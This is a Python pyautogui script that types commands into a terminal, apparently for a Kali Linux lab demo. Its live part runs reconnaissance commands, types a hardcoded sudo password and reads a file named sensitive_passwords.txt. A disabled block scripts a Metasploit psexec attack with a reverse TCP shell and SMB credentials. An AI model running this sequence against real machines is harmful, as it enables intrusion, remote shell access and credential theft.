import pyautogui

pyautogui.PAUSE = 1.0
pyautogui.hotkey('ctrl', 'alt', 't')
pyautogui.PAUSE = 1.0

pyautogui.typewrite('whoami')
pyautogui.PAUSE = 1.0
pyautogui.typewrite(['Enter'])
pyautogui.PAUSE = 1.0

pyautogui.typewrite('ping 8.8.8.8')
pyautogui.PAUSE = 1.0
pyautogui.typewrite(['Enter'])
pyautogui.PAUSE = 1.0

pyautogui.hotkey('ctrl', 'z')
pyautogui.PAUSE = 1.0

pyautogui.typewrite('sudo ifconfig')
pyautogui.PAUSE = 1.0
pyautogui.typewrite(['Enter'])
pyautogui.PAUSE = 1.0

pyautogui.typewrite('kali')
pyautogui.typewrite(['Enter'])
pyautogui.PAUSE = 1.0

'''
pyautogui.typewrite('msfconsole')
pyautogui.typewrite(['Enter'])
pyautogui.PAUSE = 13.0

pyautogui.typewrite('use exploit/windows/smb/psexec')
pyautogui.typewrite(['Enter'])
pyautogui.PAUSE = 1.0

pyautogui.typewrite('set RHOST 192.168.1.100')
pyautogui.typewrite(['Enter'])
pyautogui.PAUSE = 1.0

pyautogui.typewrite('set PAYLOAD windows/shell/reverse_tcp')
pyautogui.typewrite(['Enter'])
pyautogui.PAUSE = 1.0

pyautogui.typewrite('set LHOST 10.0.2.15')
pyautogui.typewrite(['Enter'])
pyautogui.PAUSE = 1.0

pyautogui.typewrite('set LPORT 4444')
pyautogui.typewrite(['Enter'])
pyautogui.PAUSE = 1.0

pyautogui.typewrite('set SMBUSER victim')
pyautogui.typewrite(['Enter'])
pyautogui.PAUSE = 1.0

pyautogui.typewrite('set SMBPASS s3cr3t')
pyautogui.typewrite(['Enter'])
pyautogui.PAUSE = 1.0

pyautogui.typewrite('exploit')
pyautogui.typewrite(['Enter'])
pyautogui.PAUSE = 15.0

pyautogui.typewrite('exit')
pyautogui.typewrite(['Enter'])
pyautogui.PAUSE = 1.0
'''

pyautogui.typewrite('git clone https://github.com/javanikeed/business_data.git')
pyautogui.typewrite(['Enter'])
pyautogui.PAUSE = 5.0

pyautogui.typewrite('ls')
pyautogui.typewrite(['Enter'])
pyautogui.PAUSE = 1.0

pyautogui.typewrite('cd business_data')
pyautogui.typewrite(['Enter'])
pyautogui.PAUSE = 1.0

pyautogui.typewrite('cat sensitive_passwords.txt')
pyautogui.typewrite(['Enter'])
pyautogui.PAUSE = 1.0

pyautogui.typewrite('df -h')
pyautogui.typewrite(['Enter'])
pyautogui.PAUSE = 1.0


